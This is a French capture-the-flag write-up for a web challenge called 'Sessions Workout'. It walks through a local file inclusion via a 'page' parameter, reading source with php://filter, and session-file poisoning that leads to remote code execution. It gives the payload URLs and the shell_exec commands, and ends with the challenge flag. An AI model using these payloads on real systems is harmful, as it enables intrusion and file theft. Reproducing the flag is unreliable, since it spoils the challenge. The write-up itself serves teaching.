# Sessions Workout

### Catégorie

Web

### Description

Des personnes malveillantes menacent d'exposer la vie de célébrités au grand public.. il faut absolument empêcher ça !!<br>
Vous avez pour but de récupérer un fichier contenu dans le home de l'utilisateur.

http://challs.heroctf.fr:3005/

Format : Hero{flag}

### Auteur

Worty

### Solution

Quand on arrive sur la page index.php, rien n'est apparant. Quand on commence à se balader sur le site, on remarque que les fichiers php sont accédés via un paramètre "page".

Ce paramètre est donc contrôlé par l'utilisateur, et donc potentiellement faillé. On essaye de passer un payload de type LFI "../../../../../etc/passwd". BOOM on récupère le fichier demandé, il y a donc une faille de type LFI.

Pour savoir ce qu'on peut en faire, on peut aller voir : https://github.com/swisskyrepo/PayloadsAllTheThings.

On sait que l'on doit aller lire un fichier dans le home de l'utilisateur, hors, on ne connait pas du tout le nom de son home. Nous allons donc devoir passer par un faille de type RCE (Remote Code Execution).

Avec la LFI, on récupère le contenu du fichier index.php : http://challs.heroctf.fr:3005/index.php?page=php://filter/convert.base64-encode/resource=index.php.

Dans ce fichier, on remarque plusieurs choses :
    - session_save_path('./OhD4Sessions'); : les sessions sont stockés dans un dossier qui est accessible par l'utilisateur.
    - $_SESSION['page'] = $_REQUEST['page']; : ce qui est passé dans le paramètre page est stocké dans la session.

Nous allons donc utiliser cette option pour passer notre code PHP et arriver à notre but !

Payload : http://challs.heroctf.fr:3005/index.php?page=<?php phpinfo(); ?>, ici, le serveur nous répond que le fichier n'existe pas, forcément, puisque c'est du code PHP.
On va donc maintenant accéder à notre session AVEC le paramètre page car on veut que notre code PHP soit exécuté.

Payload :  http://challs.heroctf.fr:3005/index.php?page=./OhD4Sessions/sess_<ID>
BOOM ! Notre code php est exécuté, nous avons donc notre RCE.

Nous allons donc maintenant devoir lister le contenu du dossier /home, pour connaître le nom de l'utilisateur :
Payload : http://challs.heroctf.fr:3005/index.php?page=<?php var_dump(shell_exec("ls /home")); ?>
On réaccède à notre session grâce à la LFI, et on remarque dans le dossier home l'utilisateur haxorhome.

Nous allons donc maintenant récupérer le nom du fichier à récupérer :
Payload : http://challs.heroctf.fr:3005/index.php?page=<?php var_dump(shell_exec("ls /home/haxorhome")); ?>
On réaccède à notre session grâce à la LFI, on remarque que le fichier se nomme flag.txt.

Payload final : http://challs.heroctf.fr:3005/index.php?page=<?php var_dump(shell_exec("cat /home/haxorhome/flag.txt")); ?>, et on réaccède à notre session grâce à la LFI, flag !

### Flag

Hero{p4y_4tt3nt10n_t0_s3ss1on_n3xt_t1m3_!!}